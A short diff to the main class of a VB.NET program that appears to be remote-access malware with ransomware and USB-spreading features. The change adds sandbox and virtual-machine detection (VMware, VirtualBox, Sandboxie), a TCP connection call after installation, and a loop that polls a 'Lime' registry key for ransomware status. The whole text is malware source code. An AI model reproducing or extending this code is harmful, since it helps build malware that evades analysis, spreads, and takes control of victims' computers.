@@ -55,6 +55,13 @@ Public Class Main
             End If
         End Try
 
+        If Settings.ANTI Then
+            Call VMware()
+            Call Virtualbox()
+            Call Sandboxie()
+            Call Win_XP()
+        End If
+
         Call Installation.INS()
 
         If Settings.USB Then
@@ -62,16 +69,19 @@ Public Class Main
             T1.Start()
         End If
 
+        TCP.CON()
+
         Dim CHK As Thread = New Thread(AddressOf Checking)
         CHK.Start()
     End Sub
 
     Private Shared Sub Checking()
         Thread.CurrentThread.Sleep(5000)
+        Dim Old2 As String = ID.USBSP
+        Dim Old As String = ID.Ransomeware
 1:
         Try
-            Dim Old2 As String = ID.USBSP
-            Dim Old As String = ID.Ransomeware
+
             While True
                 Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing)
                 If Old <> readValue.ToString Then
